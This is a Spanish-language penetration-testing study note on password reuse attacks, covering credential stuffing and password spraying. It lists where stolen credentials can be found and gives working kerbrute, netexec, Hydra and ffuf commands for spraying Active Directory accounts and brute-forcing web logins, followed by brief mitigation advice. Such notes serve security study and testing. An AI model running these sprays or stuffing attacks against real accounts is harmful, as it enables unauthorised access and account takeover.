---
aliases:
  - Credential Stuffing
  - Password Spray
tags:
  - estado/completo
  - technique/credential-access
  - cred/brute-force
kind: Technique
linked:
  - "[[HTTP Brute Forcing - Tipos Especiales]]"
  - "[[Auth Bypass - Brute Force y Credential Stuffing]]"
  - "[[Pass-the-Hash]]"
---
# Password Reuse

> [!info]
> Aprovechar credenciales obtenidas en un sistema/breach para acceder a otros sistemas donde fueron reutilizadas. Operativa low-noise vs brute-force tradicional.

***

## Variantes

| Variante | Mecanismo | Caso típico |
|---|---|---|
| **Credential Stuffing** | Lista `user:pass` de breach → probar masivo en target | Login web post-breach |
| **Password Spray** | 1-2 contraseñas comunes × muchos usuarios | Evita lockout, "Spring2024!" en AD |
| **Local pivot** | Cred encontrada en host A → probar en host B/C | AD lateral movement |
| **Service pivot** | Pwd del web → probar SSH/RDP/SMB | Múltiples servicios |

***

## Fuentes de credenciales

- Breach dumps: `haveibeenpwned`, ComboLists públicas
- Local discovery: bash_history, `/etc/passwd`, config files
- Memory: [[LSASS Dumping]], Mimikatz
- Files: `.env`, `web.config`, `wp-config.php`, KeePass, Putty saved sessions
- Network sniffing: [[LLMNR & NBT-NS Poisoning]], [[Responder]]
- AD: [[Kerberoasting]], [[AS-REP Roasting]], GPP cpassword

***

## Operativa AD (Spray)

```bash
# kerbrute password spray (sigiloso, no logs failed-login)
kerbrute passwordspray -d domain.local users.txt 'Spring2024!'

# netexec SMB spray
netexec smb <target> -u users.txt -p 'Spring2024!' --continue-on-success

# netexec con dominio
netexec smb dc.domain.local -u users.txt -p 'Spring2024!' -d domain.local
```

***

## Operativa Web (Stuffing)

```bash
# Hydra (HTTP POST)
hydra -L users.txt -P passwords.txt <target> http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"

# ffuf (más flexible)
ffuf -w users.txt:USER -w passwords.txt:PASS \
  -X POST -d 'user=USER&pass=PASS' \
  -u http://target/login \
  -fr 'Invalid'
```

Ver [[HTTP Brute Forcing - Tipos Especiales]].

***

## Detección / Mitigación

- Lockout policies (cuidado con spray que evita esto)
- MFA en endpoints externos
- Anomaly detection (mismo `user` desde múltiples IPs / horarios atípicos)
- Password policies + breach corpus check (al setear pwd validar contra HIBP)

***

## Notas Relacionadas

- [[HTTP Brute Forcing]]
- [[Auth Bypass - Brute Force y Credential Stuffing]]
- [[Pass-the-Hash]]
- [[Pass-the-Ticket]]
- [[Cracking Hashes]]
